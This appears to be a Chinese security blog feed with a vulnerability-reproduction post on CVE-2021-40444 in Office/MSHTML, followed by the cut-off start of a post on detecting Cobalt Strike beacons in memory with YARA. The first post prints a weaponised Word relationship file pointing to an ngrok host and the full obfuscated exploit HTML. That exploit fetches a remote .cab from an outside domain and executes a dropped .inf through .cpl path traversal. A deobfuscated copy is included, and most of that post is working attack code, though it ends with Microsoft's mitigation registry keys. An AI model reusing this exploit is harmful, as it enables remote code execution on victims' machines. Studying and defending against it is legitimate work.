      <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>office 2016<br>windows 10 ver:1909</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和十年前的IE网马一样，IE自动安装新的插件导致该漏洞，以及office可以引用mshtml格式，导致排版引擎模板可执行</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>（安了office 2016才有的CLSID，office 2010并没有）<br>这个漏洞是利用ie的COM口实现的。CLSID:edbc374c-5730-432a-b5b8-de94f0b57217<br><img src="https://z3.ax1x.com/2021/09/13/4PcrSH.png" alt=""></p><p>安了office 2010的win7<br><img src="https://z3.ax1x.com/2021/09/13/4Pcgmt.png" alt=""></p><p>原样本地址：<a href="https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#" target="_blank" rel="noopener">https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#</a><br>修改word/_rels/document.xml，将hdusi.com改为自己的IP</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId8&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme&quot; Target=&quot;theme/theme1.xml&quot;/&gt;&lt;Relationship Id=&quot;rId3&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings&quot; Target=&quot;webSettings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId7&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable&quot; Target=&quot;fontTable.xml&quot;/&gt;&lt;Relationship Id=&quot;rId2&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings&quot; Target=&quot;settings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot; Target=&quot;styles.xml&quot;/&gt;&lt;Relationship Id=&quot;rId6&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject&quot; Target=&quot;mhtml:http://3079-183-6-55-142.ngrok.io/word.html!x-usc:http://3079-183-6-55-142.ngrok.io/word.html&quot; TargetMode=&quot;External&quot;/&gt;&lt;Relationship Id=&quot;rId5&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image2.wmf&quot;/&gt;&lt;Relationship Id=&quot;rId4&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image1.jpeg&quot;/&gt;&lt;/Relationships&gt;</code></pre><p>或者直接用已经公开的exp生成：<a href="https://github.com/lockedbyte/CVE-2021-40444" target="_blank" rel="noopener">https://github.com/lockedbyte/CVE-2021-40444</a><br>效果如下<br><img src="https://z3.ax1x.com/2021/09/13/4PcL7V.jpg" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PgS1J.jpg" alt=""></p><p>触发漏洞主要是word.html里的js和原版混淆的一样，只是改了远程请求链接</p><pre><code class="javascrript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;    &lt;/head&gt;    &lt;body&gt;&lt;!-- 这段js利用[]进行函数执行     --&gt;&lt;!-- 重复的垃圾代码 --&gt;        &lt;script&gt;            var a0_0x127f = [&#39;123&#39;, &#39;365952KMsRQT&#39;, &#39;tiveX&#39;, &#39;/Lo&#39;, &#39;./../../&#39;, &#39;contentDocument&#39;, &#39;ppD&#39;, &#39;Dat&#39;, &#39;close&#39;, &#39;Acti&#39;, &#39;removeChild&#39;, &#39;mlF&#39;, &#39;write&#39;, &#39;./A&#39;, &#39;ata/&#39;, &#39;ile&#39;, &#39;../&#39;, &#39;body&#39;, &#39;setAttribute&#39;, &#39;#version=5,0,0,0&#39;, &#39;ssi&#39;, &#39;iframe&#39;, &#39;748708rfmUTk&#39;, &#39;documentElement&#39;, &#39;lFile&#39;, &#39;location&#39;, &#39;159708hBVRtu&#39;, &#39;a/Lo&#39;, &#39;Script&#39;, &#39;document&#39;, &#39;call&#39;, &#39;contentWindow&#39;, &#39;emp&#39;, &#39;Document&#39;, &#39;Obj&#39;, &#39;prototype&#39;, &#39;lfi&#39;, &#39;bject&#39;, &#39;send&#39;, &#39;appendChild&#39;, &#39;Low/championship.inf&#39;, &#39;htmlfile&#39;, &#39;115924pLbIpw&#39;, &#39;GET&#39;, &#39;p/championship.inf&#39;, &#39;1109sMoXXX&#39;, &#39;./../A&#39;, &#39;htm&#39;, &#39;l/T&#39;, &#39;cal/&#39;, &#39;1wzQpCO&#39;, &#39;ect&#39;, &#39;w/championship.inf&#39;, &#39;522415dmiRUA&#39;, &#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;, &#39;88320wWglcB&#39;, &#39;XMLHttpRequest&#39;, &#39;championship.inf&#39;, &#39;Act&#39;, &#39;D:edbc374c-5730-432a-b5b8-de94f0b57217&#39;, &#39;open&#39;, &#39;&lt;bo&#39;, &#39;HTMLElement&#39;, &#39;/..&#39;, &#39;veXO&#39;, &#39;102FePAWC&#39;];            function a0_0x15ec(_0x329dba, _0x46107c) {                return a0_0x15ec = function(_0x127f75, _0x15ecd5) {                    _0x127f75 = _0x127f75 - 0xaa;                    var _0x5a770c = a0_0x127f[_0x127f75];                    return _0x5a770c;                }                ,                a0_0x15ec(_0x329dba, _0x46107c); //a0_0x15ec函数主要调用返回            }            (function(_0x59985d, _0x17bed8) { //_0x59985d -&gt; a0_0x127f                var _0x1eac90 = a0_0x15ec;                while (!![]) {                    try {                        var _0x2f7e2d = parseInt(_0x1eac90(0xce)) + parseInt(_0x1eac90(0xd8)) * parseInt(_0x1eac90(0xc4)) + parseInt(_0x1eac90(0xc9)) * -parseInt(_0x1eac90(0xad)) + parseInt(_0x1eac90(0xb1)) + parseInt(_0x1eac90(0xcc)) + -parseInt(_0x1eac90(0xc1)) + parseInt(_0x1eac90(0xda));                        if (_0x2f7e2d === _0x17bed8) //判断两者数值是否等于384881，如果相等则break                            break;                        else                            _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]()); //将a0_0x127f数组首位元素移动到数组尾部                    } catch (_0x34af1e) {                        _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]());                    }                }            }(a0_0x127f, 0x5df71), //数组元素移动到尾部的算法            function() {                var _0x2ee207 = a0_0x15ec                  , _0x279eab = window                  , _0x1b93d7 = _0x279eab[_0x2ee207(0xb4)] //调用的a0_0x15ec函数 -&gt; window.document                  , _0xcf5a2 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][&#39;createElement&#39;] // -&gt; Document.prototype.createElement                  , _0x4d7c02 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][_0x2ee207(0xe5)] // -&gt; Document.prototype.write                  , _0x1ee31c = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xbe)] // -&gt; HTMLElement.prototype.appendChild                  , _0x2d20cd = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xe3)] // -&gt; HTMLElement.prototype.removeChild                  , _0x4ff114 = _0xcf5a2[&#39;call&#39;](_0x1b93d7, _0x2ee207(0xac)); // -&gt; Document.prototype.createElement.call(window.document,&quot;iframe&quot;) -&gt; &lt;new iframe&gt;                try {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.appendChild.call(window.document.body,&lt;new iframe&gt;) //添加iframe标签                } catch (_0x1ab454) {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xae)], _0x4ff114);                }                var _0x403e5f = _0x4ff114[_0x2ee207(0xb6)][&#39;ActiveXObject&#39;] // -&gt; &lt;new iframe&gt;.contentWindow.ActiveXObject                  , _0x224f7d = new _0x403e5f(_0x2ee207(0xc6) + _0x2ee207(0xbb) + &#39;le&#39;); // -&gt; new _0x403e5f(&#39;htmlfile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;)                _0x4ff114[_0x2ee207(0xde)][&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; &lt;new iframe&gt;.contentDocument.open().close()                var _0x371a71 = &#39;p&#39;;                try {                    _0x2d20cd[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.removeChild.call(window.document.body,&lt;new iframe&gt;)                } catch (_0x3b004e) {                    _0x2d20cd[&#39;call&#39;](_0x1b93d7[&#39;documentElement&#39;], _0x4ff114);                }                function _0x2511dc() {                    var _0x45ae57 = _0x2ee207;                    return _0x45ae57(0xcd);                }                _0x224f7d[&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; _0x224f7d.open().close()  -&gt; new ActiveXObject(&#39;htmlfijle&#39;).open().close()                var _0x3e172f = new _0x224f7d[(_0x2ee207(0xb3))][(_0x2ee207(0xd1)) + &#39;iveX&#39; + (_0x2ee207(0xb9)) + (_0x2ee207(0xca))](&#39;htm&#39; + _0x2ee207(0xaf)); // -&gt; new _0x224f7d.Script.ActiveXObject(&#39;htmlFile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;).Script.ActiveXObject(&#39;htmlFile&#39;)                _0x3e172f[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x3e172f.open().close()                var _0xd7e33d = &#39;c&#39;                  , _0x35b0d4 = new _0x3e172f[(_0x2ee207(0xb3))][&#39;Ac&#39; + (_0x2ee207(0xdb)) + &#39;Ob&#39; + &#39;ject&#39;](&#39;ht&#39; + _0x2ee207(0xe4) + _0x2ee207(0xe8)); // -&gt; new _0x3e172f.Script.ActiveXObject(&#39;htmlFile&#39;)                _0x35b0d4[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x35b0d4.open().close()                var _0xf70c6e = new _0x35b0d4[&#39;Script&#39;][(_0x2ee207(0xe2)) + (_0x2ee207(0xd7)) + (_0x2ee207(0xbc))](&#39;ht&#39; + &#39;mlF&#39; + _0x2ee207(0xe8));                _0xf70c6e[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; new _0x35b0d4.Script.ActiveXObject(&#39;htmlFile&#39;)                var _0xfed1ef = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x5f3191 = new ActiveXObject(_0x2ee207(0xc0)) // new ActiveXObject(&#39;htmlFile&#39;)                  , _0xafc795 = new ActiveXObject(_0x2ee207(0xc0))                  , _0x5a6d4b = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x258443 = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x53c2ab = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x3a627b = _0x279eab[_0x2ee207(0xcf)] //window.XMLHttpRequest                  , _0x2c84a8 = new _0x3a627b() // new window.XMLHttpRequest()                  , _0x220eee = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xd3)] //&lt;XMLHttpRequest&gt;.prototype.open                  , _0x3637d8 = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xbd)] //&lt;XMLHttpRequest&gt;.prototype.send                  , _0x27de6f = _0x279eab[&#39;setTimeout&#39;]; //window.XMLHttpRequest.setTimeout                _0x220eee[_0x2ee207(0xb5)](_0x2c84a8, _0x2ee207(0xc2), _0x2511dc(), ![]), //&lt;XMLHttpRequest&gt;.prototype.open.call(&lt;XMLHttpRequest&gt;,&#39;GET&#39;,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;,![])                _0x3637d8[_0x2ee207(0xb5)](_0x2c84a8),//&lt;XMLHttpRequest&gt;.prototype.send.call(&lt;XMLHttpRequest&gt;,)                _0xf70c6e[_0x2ee207(0xb3)][_0x2ee207(0xb4)][_0x2ee207(0xe5)](_0x2ee207(0xd4) + &#39;dy&gt;&#39;); //_0xf70c6e.Script.document.write(&#39;&lt;body&gt;&#39;)                var _0x126e83 = _0xcf5a2[_0x2ee207(0xb5)](_0xf70c6e[&#39;Script&#39;][_0x2ee207(0xb4)], &#39;ob&#39; + &#39;je&#39; + &#39;ct&#39;); //Document.prototype.createElement.call(_0xf70c6e.Script.document,&#39;object&#39;)                _0x126e83[_0x2ee207(0xeb)](&#39;co&#39; + &#39;de&#39; + &#39;ba&#39; + &#39;se&#39;, _0x2511dc() + _0x2ee207(0xaa)); //_0x126e83.setAttribute(codebase,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab#version=5,0,0,0&#39;)                var _0x487bfa = &#39;l&#39;;                _0x126e83[_0x2ee207(0xeb)](&#39;c&#39; + &#39;la&#39; + _0x2ee207(0xab) + &#39;d&#39;, &#39;CL&#39; + &#39;SI&#39; + _0x2ee207(0xd2)), //_0x126e83.setAttribute(&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;)                _0x1ee31c[_0x2ee207(0xb5)](_0xf70c6e[_0x2ee207(0xb3)][&#39;document&#39;][&#39;body&#39;], _0x126e83), //HTMLElement.prototype.appendChild.call(_0xf70c6e.Script.document.body,_0x126e83)                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                //_0xfed1ef.Script.location=&#39;.cpl:123&#39;                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[&#39;Script&#39;][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xc5) + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb)                &lt;!-- 重复垃圾代码分割线2 --&gt;                //_0xfed1ef.Script.location==&#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,                _0x5f3191[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + _0x2ee207(0xe0) + &#39;a/Lo&#39; + &#39;ca&#39; + _0x2ee207(0xc7) + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0xafc795[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + &#39;./../A&#39; + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + &#39;w/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + _0x2ee207(0xe9) + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + &#39;Dat&#39; + _0x2ee207(0xb2) + &#39;ca&#39; + &#39;l/T&#39; + &#39;em&#39; + _0x2ee207(0xc3),                _0x258443[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + _0x2ee207(0xdd) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb),                _0x5a6d4b[&#39;Script&#39;][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;../&#39; + &#39;..&#39; + &#39;/.&#39; + &#39;./../T&#39; + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xe9) + _0x2ee207(0xe9) + _0x2ee207(0xbf),                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;../&#39; + _0x2ee207(0xe9) + _0x2ee207(0xd0);                &lt;!-- 重复垃圾代码分割线2 --&gt;            }());        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>公开POC里的deob.html为作者解密混淆后写的</p><pre><code class="javascrript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            function garbage() {                return &#39;garbage&#39;;            }            (function exploit() {                var iframe = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](window[&quot;document&quot;], &#39;iframe&#39;); //创建一个iframe标签的object                try {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //当前body内容里添加iframe标签                } catch (_0x1ab454) {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);                }                var htmlfile = iframe[&#39;contentWindow&#39;][&#39;ActiveXObject&#39;] //实例化ActiveXObject                  , htmlfile2 = new htmlfile(&#39;htmlfile&#39;); //htmlfile就是一个COM版的DOM，也就是说，htmlfile是个ActiveX版的 window.document                iframe[&#39;contentDocument&#39;][&#39;open&#39;]()[&#39;close&#39;](); //没有意义                try {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //删除iframe标签                } catch (_0x3b004e) {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);                }                htmlfile2[&#39;open&#39;]()[&#39;close&#39;](); //没有意义                var htmlfile3 = new htmlfile2[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile3[&#39;open&#39;]()[&#39;close&#39;]();                var htmlfile4 = new htmlfile3[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile4[&#39;open&#39;]()[&#39;close&#39;]();                var htmlfile5 = new htmlfile4[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile5[&#39;open&#39;]()[&#39;close&#39;]();                var ActiveXObjectVAR = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR2 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR3 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR4 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR5 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR6 = new ActiveXObject(&#39;htmlfile&#39;)                  , XMLHttpR = new window[&#39;XMLHttpRequest&#39;]()                  , XMLHttpRopen = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;open&#39;]                  , XMLHttpRsend = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;send&#39;];                XMLHttpRopen[&#39;call&#39;](XMLHttpR, &#39;GET&#39;, &#39;http://127.0.0.1/test.cab&#39;, ![]), //构造请求远程端的test.cab链接                XMLHttpRsend[&#39;call&#39;](XMLHttpR), //发送请求                htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;write&#39;](&#39;body&gt;&#39;);                var htmlScript = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;], &#39;object&#39;); //创建Scriptobject                //下面这两步将会让IE自动请求远程的cab然后自动解压                htmlScript[&#39;setAttribute&#39;](&#39;codebase&#39;, &#39;http://127.0.0.1/test.cab#version=5,0,0,0&#39;); //设定codebase属性值                htmlScript[&#39;setAttribute&#39;](&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;), //设置CLSID                window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;body&#39;], htmlScript), //将scriptobject添加到body                //逐个尝试用cpl从对应的路径中执行championship.inf文件（盲猜路径执行，总有一个能成）                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,                ActiveXObjectVAR2[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/championship.inf&#39;,                ActiveXObjectVAR3[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/championship.inf&#39;,                ActiveXObjectVAR5[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../championship.inf&#39;; //设置cpl执行championship.inf            }());        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>调用XMLHttpRequest请求cab文件后 ,将自动解压到Temp目录，最后用cpl执行<br><img src="https://z3.ax1x.com/2021/09/13/4P2Ya6.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2dRe.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2wxH.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P26dP.png" alt=""></p><p>参考链接:<a href="https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html" target="_blank" rel="noopener">https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html</a></p><p>动态执行分析如下：<br>-&gt;远程请求发起<br>-&gt;mshtml.dll解析js里的内容<br>-&gt;然后下载cab文件<br>-&gt;从IE的TEMP目录找到临时的cab文件解压到C:\Users\<username>\AppData\Local\Temp<br>-&gt;最后control.exe将调用inf<br><img src="https://z3.ax1x.com/2021/09/13/4P2vQJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR9dx.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR1fS.png" alt=""></username></p><p>复现GIF<br><img src="https://z3.ax1x.com/2021/09/13/4PRGlQ.gif" alt=""></p><p>修复方案：<br>这会将 64 位和 32 位进程的所有 Internet 区域的 URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) 和 URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) 设置为 DISABLED (3)。不会安装新的 ActiveX 控件。以前安装的 ActiveX 控件将继续运行。</p><p>如何撤消解决方法<br>将策略中的选项设置为Enable。<br>要通过 regkey 在单个系统上禁用 ActiveX 控件：<br>警告如果注册表编辑器使用不当，可能会导致严重的问题，可能需要重新安装操作系统。Microsoft 不能保证您可以解决因注册表编辑器使用不当而导致的问题。使用注册表编辑器风险自负。</p><p>要禁止在 Internet Explorer 中的所有区域安装 ActiveX 控件，请将以下内容粘贴到文本文件中并使用 .reg 文件扩展名保存：</p><pre><code>Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003</code></pre><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于这几天cs进程里的特征和网上的一些bypass</title>
      <link href="/posts/40a5ffce.html"/>
      <url>/posts/40a5ffce.html</url>
      <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/" target="_blank" rel="noopener">https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/</a><br><a href="https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg</a><br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>首先cs上线进程注入个进程<br><img src="https://z3.ax1x.com/2021/09/11/hzyILF.png" alt=""></p><p>使用ProcessHacker定位到SleepEx函数<br><img src="https://z3.ax1x.com/2021/09/11/hzy7dJ.png" alt=""></p><p>转到内存保存可以看到明显的MZ头<br><img src="https://z3.ax1x.com/2021/09/11/hzyxsO.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hz6Zy8.png" alt=""></p><p>利用给出的yara规则进行进程检测，可以很明显的发现是cs的进程<br><a href="https://github.com/jas502n/cs_yara" target="_blank" rel="noopener">https://github.com/jas502n/cs_yara</a><br>遍历进程寻找cs的进程：powershell -command “Get-Process | ForEach-Object {./yara64.exe beaconEye.yar $_.ID -s}”<br><img src="https://z3.ax1x.com/2021/09/11/hz6rSx.png" alt=""></p><pre><code>rule CobaltStrike {  strings:      $cobaltStrikeRule64 = {  00 00 00 00 00 00 00 00 00 00 00 00 